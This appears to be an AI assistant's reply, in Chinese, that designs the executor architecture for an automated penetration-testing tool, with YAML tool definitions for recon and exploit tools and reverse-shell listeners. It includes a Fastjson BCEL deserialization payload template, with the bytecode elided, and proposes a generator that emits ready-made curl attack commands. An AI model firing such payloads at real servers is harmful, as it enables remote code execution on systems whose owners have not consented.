对，那就按这个思路来设计。先跑通单人，但架构上不挖坑。

## 分层设计

```
┌─────────────────────────────────────────────────────┐
│                  ToolExecutor（调度层）                │
│         根据工具类型自动路由到不同执行后端               │
└──────┬──────────────────┬──────────────────┬────────┘
       │                  │                  │
  ┌────▼────┐       ┌─────▼─────┐      ┌────▼────┐
  │  local   │       │ container │      │ remote  │
  │ 无状态工具│       │ 有状态工具  │      │ 未来扩展 │
  │ 直接执行  │       │ 按任务隔离  │      │ SSH远程  │
  └─────────┘       └───────────┘      └─────────┘
  nmap,curl,        JNDIExploit,        多人场景:
  nuclei,sqlmap     MSF listener,       每人一台
  gobuster...       反弹shell监听        攻击机
```

**单人阶段**：`local` 和 `container` 两个后端。无状态工具直接在 API 容器内执行（`subprocess`），有状态工具起一个长活容器（`docker exec`，不是每次 `docker run --rm`）。

**多人扩展时**：`container` 后端改成按 task_id 分配容器 + 动态端口。或者加 `remote` 后端 SSH 到独立攻击机。调度层接口不变，上层代码零改动。

## 工具定义用 YAML

```yaml
# tools/definitions/nmap.yaml
name: nmap
executor: local          # local | container | remote
command: "nmap {args}"
timeout: 300
category: recon

# tools/definitions/jndi_exploit.yaml
name: jndi_fastjson
executor: container      # 需要占端口，走容器
command: "/opt/jndi_fastjson.sh {target} {lhost} {cmd}"
timeout: 60
category: exploit
requires_ports: [1389, 8888]   # 多人时用来做动态端口分配
```

单人阶段 `container` 后端就是当前的 `docker run`；多人阶段改成按 task_id 分配 `base_port + offset`，YAML 不用改。

## Fastjson 的即时解决方案

回连不通的问题，不需要等架构改完。用 BCEL payload 直接打，不需要回连：

```
POST http://target:8090/
{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
 "driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},
 "driverClassName":"$$BCEL$$...编码后的恶意类字节码..."}
```

在 toolbox/API 容器里预装一个 Python 脚本 `bcel_payload_gen.py`，接收命令参数，输出完整的 curl 命令。这个是纯本地生成 + 直接 HTTP 发送，不需要任何端口监听。

## 建议的实施顺序

1. **写 BCEL payload 生成器** → fastjson 立刻能打通（1 个文件）
2. **重构 executor 为调度层 + YAML 工具定义** → 架构干净了（3-4 个文件）
3. **知识库换向量检索** → 检测准确率上去（2-3 个文件）

第 1 步是今天能见效的，第 2、3 步是架构层面的，给多人扩展留好接口。要开始写吗？